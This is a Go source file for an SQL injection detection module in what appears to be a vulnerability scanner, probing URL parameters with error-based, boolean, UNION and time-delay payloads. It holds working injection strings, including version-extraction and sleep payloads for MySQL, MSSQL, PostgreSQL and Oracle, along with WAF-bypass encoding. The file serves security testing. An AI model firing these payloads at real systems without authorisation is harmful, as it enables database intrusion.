package sqli

import (
	"context"
	"fmt"
	"net/url"
	"regexp"
	"strings"
	"time"

	"vulnscan-backend/scan/engine"
)

type SQLiScanner struct {
	base    *engine.VulnScanner
	scanCtx *engine.ScanContext
	wafEnc  *engine.WAFBypassEncoder
}

func New() *SQLiScanner {
	return &SQLiScanner{}
}

func (m *SQLiScanner) ID() string       { return "sqli" }
func (m *SQLiScanner) Name() string     { return "SQL 注入检测" }
func (m *SQLiScanner) Category() string { return "vuln" }

func (m *SQLiScanner) Params() []engine.ModuleParam {
	return []engine.ModuleParam{engine.VulnVerificationParam()}
}

func (m *SQLiScanner) Run(ctx context.Context, targets []*engine.Target, config map[string]interface{}) (*engine.ModuleResult, error) {
	m.base = engine.NewVulnScanner(config)
	m.scanCtx = engine.BuildScanContext(config)
	m.wafEnc = engine.NewWAFBypassEncoder(m.scanCtx)
	verifyLevel := engine.GetConfigValue(config, "verification_level", "both")

	result := m.base.RunTargets(ctx, m.ID(), targets, func(ctx context.Context, target *engine.Target) []*engine.Finding {
		return m.testTarget(ctx, target, verifyLevel)
	})

	engine.LogModuleComplete(m.ID(), len(targets), len(result.Findings), result.Duration)
	return result, nil
}

func (m *SQLiScanner) testTarget(ctx context.Context, target *engine.Target, verifyLevel string) []*engine.Finding {
	points := engine.ExtractInjectionPoints(target)
	if len(points) == 0 {
		parsedURL, err := url.Parse(target.URL)
		if err != nil || len(parsedURL.Query()) == 0 {
			return nil
		}
		for param := range parsedURL.Query() {
			points = append(points, engine.InjectionPoint{
				Type: engine.InjectQuery,
				Name: param,
			})
		}
	}

	if len(points) == 0 {
		return nil
	}

	baseBody := m.base.FetchBody(ctx, target.URL)
	var findings []*engine.Finding

	for _, point := range points {
		found := false

		if engine.ShouldRunPrinciple(verifyLevel) {
			if f := m.testErrorBased(ctx, target, point); f != nil {
				f.VerificationLevel = engine.VerifyPrinciple
				f.VerificationDetail = "error-pattern-match"
				findings = append(findings, f)
				found = true
			}
			if !found {
				if f := m.testUnionBased(ctx, target, point); f != nil {
					f.VerificationLevel = engine.VerifyPrinciple
					f.VerificationDetail = "union-column-probe"
					findings = append(findings, f)
					found = true
				}
			}
		}

		if engine.ShouldRunExploit(verifyLevel) {
			if f := m.testBooleanBased(ctx, target, point, baseBody); f != nil {
				f.VerificationLevel = engine.VerifyExploit
				f.VerificationDetail = "boolean-response-diff"
				findings = append(findings, f)
				found = true
			}
			if !found {
				if f := m.testTimeBased(ctx, target, point); f != nil {
					f.VerificationLevel = engine.VerifyExploit
					f.VerificationDetail = "time-delay-confirmed"
					findings = append(findings, f)
				}
			}
		}
	}

	return findings
}

func (m *SQLiScanner) testErrorBased(ctx context.Context, target *engine.Target, point engine.InjectionPoint) *engine.Finding {
	payloads := m.errorPayloads()

	for _, payload := range payloads {
		body, _, err := m.base.SendInjected(ctx, target, point, payload)
		if err != nil || body == "" {
			continue
		}

		for _, pattern := range sqlErrorPatterns {
			if pattern.MatchString(body) {
				return &engine.Finding{
					ModuleID:    m.ID(),
					Target:      target,
					Type:        "sqli_error",
					Title:       fmt.Sprintf("SQL注入(Error-based) - %s: %s", point.Type, point.Name),
					Description: fmt.Sprintf("%s参数 %s 使用 payload '%s' 触发了数据库错误", point.Type, point.Name, payload),
					Severity:    "high",
					Confidence:  85,
					Evidence:    engine.Truncate(body, 500),
					Timestamp:   time.Now(),
					Data: map[string]string{
						"param":      point.Name,
						"payload":    payload,
						"type":       "error-based",
						"inject_via": string(point.Type),
					},
				}
			}
		}
	}

	return nil
}

func (m *SQLiScanner) testBooleanBased(ctx context.Context, target *engine.Target, point engine.InjectionPoint, baseBody string) *engine.Finding {
	boolPairs := []struct {
		truePayload  string
		falsePayload string
		label        string
	}{
		{`' OR '1'='1' -- `, `' OR '1'='2' -- `, "string-quote"},
		{`" OR "1"="1" -- `, `" OR "1"="2" -- `, "double-quote"},
		{`1 OR 1=1`, `1 OR 1=2`, "numeric"},
		{`) OR (1=1`, `) OR (1=2`, "parenthesized"},
		{`' OR 1=1#`, `' OR 1=2#`, "hash-comment"},
	}

	for _, pair := range boolPairs {
		select {
		case <-ctx.Done():
			return nil
		default:
		}

		trueBody, _, _ := m.base.SendInjected(ctx, target, point, pair.truePayload)
		falseBody, _, _ := m.base.SendInjected(ctx, target, point, pair.falsePayload)

		if trueBody == "" || falseBody == "" {
			continue
		}

		trueDiff := levenshteinRatio(baseBody, trueBody)
		falseDiff := levenshteinRatio(baseBody, falseBody)
		tfDiff := levenshteinRatio(trueBody, falseBody)

		if trueDiff > 0.75 && falseDiff < 0.5 && tfDiff < 0.6 {
			return &engine.Finding{
				ModuleID:    m.ID(),
				Target:      target,
				Type:        "sqli_boolean",
				Title:       fmt.Sprintf("SQL注入(Boolean-based) - %s: %s", point.Type, point.Name),
				Description: fmt.Sprintf("%s参数 %s 使用 %s 变体检测，true/false 响应差异显著 (true=%.2f, false=%.2f, tf_diff=%.2f)", point.Type, point.Name, pair.label, trueDiff, falseDiff, tfDiff),
				Severity:    "high",
				Confidence:  75,
				Timestamp:   time.Now(),
				Data: map[string]string{
					"param":       point.Name,
					"type":        "boolean-based",
					"variant":     pair.label,
					"true_ratio":  fmt.Sprintf("%.2f", trueDiff),
					"false_ratio": fmt.Sprintf("%.2f", falseDiff),
					"inject_via":  string(point.Type),
				},
			}
		}
	}

	return nil
}

func (m *SQLiScanner) testTimeBased(ctx context.Context, target *engine.Target, point engine.InjectionPoint) *engine.Finding {
	timePayloads := m.timePayloads()

	baseStart := time.Now()
	m.base.FetchBody(ctx, target.URL)
	baselineLatency := time.Since(baseStart)
	threshold := baselineLatency + 4*time.Second

	for _, tp := range timePayloads {
		select {
		case <-ctx.Done():
			return nil
		default:
		}

		start := time.Now()
		m.base.SendInjected(ctx, target, point, tp.payload)
		elapsed := time.Since(start)

		if elapsed >= threshold && elapsed >= 4500*time.Millisecond {
			confirmStart := time.Now()
			m.base.SendInjected(ctx, target, point, tp.payload)
			confirmElapsed := time.Since(confirmStart)

			if confirmElapsed >= threshold && confirmElapsed >= 4*time.Second {
				confidence := 80
				if confirmElapsed >= 5*time.Second {
					confidence = 90
				}

				return &engine.Finding{
					ModuleID:    m.ID(),
					Target:      target,
					Type:        "sqli_time",
					Title:       fmt.Sprintf("SQL注入(Time-based) - %s: %s [%s]", point.Type, point.Name, tp.dbType),
					Description: fmt.Sprintf("%s参数 %s 使用 %s payload 触发延迟 (第1次: %v, 第2次: %v, 基线: %v)", point.Type, point.Name, tp.dbType, elapsed.Round(time.Millisecond), confirmElapsed.Round(time.Millisecond), baselineLatency.Round(time.Millisecond)),
					Severity:    "high",
					Confidence:  confidence,
					Timestamp:   time.Now(),
					Data: map[string]string{
						"param":      point.Name,
						"payload":    tp.payload,
						"db_type":    tp.dbType,
						"type":       "time-based",
						"delay_1":    elapsed.String(),
						"delay_2":    confirmElapsed.String(),
						"baseline":   baselineLatency.String(),
						"inject_via": string(point.Type),
					},
				}
			}
		}
	}

	return nil
}

func (m *SQLiScanner) testUnionBased(ctx context.Context, target *engine.Target, point engine.InjectionPoint) *engine.Finding {
	for cols := 1; cols <= 10; cols++ {
		select {
		case <-ctx.Done():
			return nil
		default:
		}

		nulls := make([]string, cols)
		for i := range nulls {
			nulls[i] = "NULL"
		}
		payload := fmt.Sprintf("' UNION SELECT %s-- ", strings.Join(nulls, ","))
		body, _, err := m.base.SendInjected(ctx, target, point, payload)
		if err != nil || body == "" {
			continue
		}

		hasError := false
		for _, pattern := range sqlErrorPatterns {
			if pattern.MatchString(body) {
				hasError = true
				break
			}
		}

		if !hasError && cols > 1 {
			return &engine.Finding{
				ModuleID:    m.ID(),
				Target:      target,
				Type:        "sqli_union",
				Title:       fmt.Sprintf("SQL注入(UNION-based) - %s: %s (%d列)", point.Type, point.Name, cols),
				Description: fmt.Sprintf("%s参数 %s 使用 UNION SELECT %d 列成功注入，无错误回显", point.Type, point.Name, cols),
				Severity:    "critical",
				Confidence:  85,
				Timestamp:   time.Now(),
				Data: map[string]string{
					"param":      point.Name,
					"payload":    payload,
					"type":       "union-based",
					"columns":    fmt.Sprintf("%d", cols),
					"inject_via": string(point.Type),
				},
			}
		}
	}
	return nil
}

var sqlErrorPatterns = []*regexp.Regexp{
	regexp.MustCompile(`(?i)SQL syntax.*MySQL`),
	regexp.MustCompile(`(?i)Warning.*mysql_`),
	regexp.MustCompile(`(?i)valid MySQL result`),
	regexp.MustCompile(`(?i)MySqlClient\.`),
	regexp.MustCompile(`(?i)PostgreSQL.*ERROR`),
	regexp.MustCompile(`(?i)Warning.*pg_`),
	regexp.MustCompile(`(?i)valid PostgreSQL result`),
	regexp.MustCompile(`(?i)ORA-\d{5}`),
	regexp.MustCompile(`(?i)Oracle error`),
	regexp.MustCompile(`(?i)Microsoft OLE DB Provider for SQL Server`),
	regexp.MustCompile(`(?i)\[Microsoft\]\[ODBC SQL Server Driver\]`),
	regexp.MustCompile(`(?i)Unclosed quotation mark`),
	regexp.MustCompile(`(?i)SQLite3::`),
	regexp.MustCompile(`(?i)SQLite/JDBCDriver`),
	regexp.MustCompile(`(?i)sqlite3\.OperationalError`),
	regexp.MustCompile(`(?i)SQLSTATE\[\d+\]`),
	regexp.MustCompile(`(?i)Syntax error.*in query expression`),
}

func (m *SQLiScanner) errorPayloads() []string {
	base := []string{`'`, `"`, `1'"\`}

	db := m.scanCtx.DetectedDBType()
	switch db {
	case "mysql":
		base = append(base,
			`' OR '1'='1`, `1 UNION SELECT NULL--`,
			`1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--`,
			`1' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--`,
			`1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--`,
		)
	case "mssql":
		base = append(base,
			`' OR '1'='1`, `1 UNION SELECT NULL--`,
			`1 AND 1=CONVERT(int,@@version)--`,
		)
	case "postgresql":
		base = append(base,
			`' OR '1'='1`, `1 UNION SELECT NULL--`,
			`1';SELECT PG_SLEEP(0)--`,
		)
	case "oracle":
		base = append(base,
			`' OR '1'='1`,
			`1' AND 1=ctxsys.drithsx.sn(1,(SELECT banner FROM v$version WHERE rownum=1))--`,
		)
	default:
		base = append(base,
			`' OR '1'='1`, `1' AND '1'='2`, `1 UNION SELECT NULL--`,
			`') OR ('1'='1`,
			`1 AND 1=CONVERT(int,@@version)--`,
			`1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--`,
			`1' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--`,
			`1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--`,
			`1';SELECT PG_SLEEP(0)--`,
			`1' AND 1=ctxsys.drithsx.sn(1,(SELECT banner FROM v$version WHERE rownum=1))--`,
		)
	}

	if m.wafEnc.HasWAF() {
		base = m.wafEnc.EncodePayloads(base)
	}
	return base
}

func (m *SQLiScanner) timePayloads() []struct {
	payload string
	dbType  string
} {
	all := []struct {
		payload string
		dbType  string
	}{
		{`' OR SLEEP(5)-- `, "MySQL"},
		{`" OR SLEEP(5)-- `, "MySQL"},
		{`1; WAITFOR DELAY '0:0:5'-- `, "MSSQL"},
		{`'; WAITFOR DELAY '0:0:5'-- `, "MSSQL"},
		{`1'; SELECT PG_SLEEP(5)-- `, "PostgreSQL"},
		{`' || PG_SLEEP(5)-- `, "PostgreSQL"},
		{`1' AND BENCHMARK(5000000,SHA1('test'))-- `, "MySQL-benchmark"},
	}

	db := m.scanCtx.DetectedDBType()
	if db == "" {
		return all
	}

	var filtered []struct {
		payload string
		dbType  string
	}
	for _, tp := range all {
		if strings.EqualFold(tp.dbType, db) || strings.HasPrefix(strings.ToLower(tp.dbType), db) {
			filtered = append(filtered, tp)
		}
	}
	if len(filtered) == 0 {
		return all
	}
	return filtered
}

func levenshteinRatio(a, b string) float64 {
	if len(a) == 0 && len(b) == 0 {
		return 1.0
	}

	la := min(len(a), 2000)
	lb := min(len(b), 2000)
	a = a[:la]
	b = b[:lb]

	common := 0
	setA := make(map[string]int)
	for _, line := range strings.Split(a, "\n") {
		setA[strings.TrimSpace(line)]++
	}
	for _, line := range strings.Split(b, "\n") {
		key := strings.TrimSpace(line)
		if setA[key] > 0 {
			common++
			setA[key]--
		}
	}

	total := len(strings.Split(a, "\n")) + len(strings.Split(b, "\n"))
	if total == 0 {
		return 1.0
	}
	return float64(2*common) / float64(total)
}
